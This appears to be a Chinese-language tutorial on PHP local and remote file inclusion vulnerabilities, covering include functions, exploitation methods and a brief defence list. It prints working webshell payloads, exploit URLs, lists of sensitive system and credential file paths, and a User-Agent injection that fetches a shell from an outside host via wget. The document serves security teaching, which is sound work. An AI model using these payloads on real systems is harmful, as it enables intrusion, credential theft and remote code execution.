为了更好地使用代码的重用性，引入了文件包含函数，可以通过文件包含函数将文件包含进来，直接使用包含文件的代码。</br>
几乎所有的脚本语言中都会提供文件包含的功能，但文件包含漏洞在PHP Web Application中居多，在JSP、ASP中十分少甚至没有，问题在于语言设计的弊端。</br>

## 文件包含漏洞原理
在包含文件时候，为了灵活包含文件，将被包含文件设置为变量，通过动态变量来引入需要包含的文件时，用户可以对变量的值可控；</br>
而且没有对包含的文件进行过滤或者严格过滤，直接带入包含函数，攻击者可以利用其加载其他文件，执行非预期的操作，由此造成文件包含漏洞。

## PHP文件包含函数
**include( )**</br>
当使用该函数包含文件时，只有代码执行到 include()函数时才将文件包含</br>
进来，发生错误时之给出一个警告，继续向下执行。</br>
**include_once( )**</br>
功能与 Include()相同，区别在于当重复调用同一文件时，程序只调用一次</br>
**require( )**</br>
require()与 include()的区别在于 require()执行如果发生错误，函数会输出</br>
错误信息，并终止脚本的运行。</br>
**require_once( )**</br>
功能与 require()相同，区别在于当重复调用同一文件时，程序只调用一次。

## 文件包含漏洞分类
PHP中的文件包含分为本地包含和远程包含。</br>
**（一）本地包含 Local File Include (LFI)**</br>
（1）、所包含文件内容符合PHP语法规范：任何扩展名都可以被PHP解析；</br>
（2）、包含非PHP语法规范源文件，会暴露其源代码。</br>
**（二）远程包含 Remote File Include (RFI)**</br>
如果要使用远程包含功能，首先需要确定PHP是否已经开启远程包含功能选项（php默认关闭远程包含功能：allow_url_include=off），开启远程包含功能需要在php.ini配置文件中修改。
远程包含与本地包含没有区别，无论是哪种扩展名，只要遵循PHP语法规范，PHP解析器就会对其解析。

## 文件包含漏洞利用
### （一）读取敏感文件
常见的敏感信息路径：</br>
**Windows系统：**</br>
C:\boot.ini  //查看系统版本</br>
  C:\windows\system32\inetsrv\MetaBase.xml  //IIS配置文件</br>
  C:\windows\repair\sam  //存储Windows系统初次安装的密码</br>
  C:\Program Files\mysql\my.ini  //Mysql配置</br>
  C:\Program Files\mysql\data\mysql\user.MYD  //Mysql root</br>
  C:\windows\php.ini  //php配置信息</br>
  C:\windows\my.ini  //Mysql配置文件</br>
  ......</br>
**Linux系统：**</br>
/etc/passwd </br>
  /usr/local/app/apache2/conf/httpd.conf  //apache2默认配置文件</br>
  /usr/local/app/apache2/conf/extra/httpd-vhosts.conf  //虚拟网站设置</br>
  /usr/local/app/php5/lib/php.ini  //PHP相关设置</br>
  /etc/httpd/conf/httpd.conf  //apache配置文件</br>
  /etc/my.cnf  //Mysql的配置文件</br>
  ......

### （二）远程包含shell
allow_url_fopen选项是激活的，可以尝试远程包含一句话木马。</br>
（1）访问http://20.20.20.20/echo.txt内容为：</br>
<?fputs(open("shell.php","w"),"<?php eval($_POST[1]);?>")?></br>
（2）payload：http://www.aaa.com/index.php?page=http://20.20.20.20/echo.txt

### （三）本地包含配合文件上传
（1）上传一句话图片木马，得知图片路径（/upload/1.jpg)，图片代码为<?fputs(open("shell.php","w"),"<?php eval($_POST[1]);?>")?></br>
（2）payload：http://www.xxx.com/index.php?page=./upload/1.jpg，包含这张图片并在index.php所在目录生成shell.php。

### （四）使用PHP封装协议
PHP带有很多内置URL风格的封装协议，这类协议与fopen()、copy()、file_exists()、file size()等文件系统函数所提供的功能类似。</br>
使用封装协议读取PHP文件：http://192.168.11.55:8080/dvwa/vulnerabilities/fi/?page=php://filter/read=convert.base64-encode/resource=x.php

### （五）包含Apache日志文件
Apache服务器运行后会生成两个日志文件，这两个文件是access.log(访问日志)和error.log(错误日志)，apache的日志文件记录下我们的操作，并且写到访问日志文件access.log之中。</br>
    日志默认路径</br>
    (1) apache+Linux日志默认路径</br>
    /etc/httpd/logs/access_log或者/var/log/httpd/access log</br>
    (2) apache+win2003日志默认路径</br>
    (3) IIS6.0+win2003默认日志文件 C:WINDOWSsystem32Logfiles</br>
    (4) IIS7.0+win2003 默认日志文件 %SystemDrive%inetpublogsLogFiles</br>
    (5) nginx 日志文件在用户安装目录的logs目录下 如安装目录为/usr/local/nginx,则日志目录就是在/usr/local/nginx/logs里 也可通过其配置文件Nginx.conf，获取到日志的存在路径(/opt/nginx/logs/access.log)</br>
    web中间件默认配置</br>
    (1) apache+linux 默认配置文件 /etc/httpd/conf/httpd.conf</br>
    或者index.php?page=/etc/init.d/httpd</br>
    (2) IIS6.0+win2003 配置文件 C:/Windows/system32/inetsrv/metabase.xml</br>
    (3) IIS7.0+WIN 配置文件 C:WindowsSystem32inetsrvconfigapplicationHost.config

### （六）截断包含
只适用于magic_quotes_gpc=off的情况，如果为on，%00（NULL）将会被转义，从而无法正常截断。

### （七）绕过WAF防火墙

### （八）包含session
    利用条件:session文件路径已知，且其中内容部分可控。</br>
    PHP默认生成的Session文件往往存放在/tmp目录下 /tmp/sess_SESSIONID ?file=../../../../../../tmp/sess_tnrdo9ub2tsdurntv0pdir1no7</br>
    (session文件一般在/tmp目录下，格式为sess_[your phpsessid value]，有时候也有可能在/var/lib/php5之类 的，在此之前建议先读取配置文件。在某些特定的情况下如果你能够控制session的值，也许你能够获得一个 shell)

### （九）包含/proc/self/environ文件
**利用条件:**</br>
  （1）php以cgi方式运行，这样environ才会保持UA头。</br>
  （2）environ文件存储位置已知，且environ文件可读。
**姿势:**
    proc/self/environ中会保存user-agent头。如果在user-agent中插入php代码，则php代码会被写入到environ中。 之后再包含它，即可。</br>
    ?file=../../../../../../../proc/self/environ 选择User-Agent</br>
    写代码如下:</br>
   <?system('wget http://www.yourweb.com/oneword.txt -O shell.php');?></br>
然后提交请求。

### （十）包含临时文件

（1）php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用c:\winsdows\temp目录。在临 时文件被删除之前，利用竞争即可包含该临时文件。</br>
（2）由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的随机函数有缺陷，而window下只有 65535中不同的文件名，所以这个方法是可行的。另一种方法phpinfo来获取临时文件的路径以及名称,然后临时文 件在极短时间被删除的时候,需要竞争时间包含临时文件拿到webshell。

## 文件包含漏洞防御
（1）路径限制</br>
（2）过滤.（点）/（反斜杠）\（反斜杠）</br>
（3）包含文件验证</br>
（4）尽量不要使用动态包含，可以在需要包含的页面固定写好</br>
（5）严格判断包含中的参数是否外部可控</br>
（6）PHP用open_basedir配置限制访问</br>
（7）禁止服务器远程文件包含
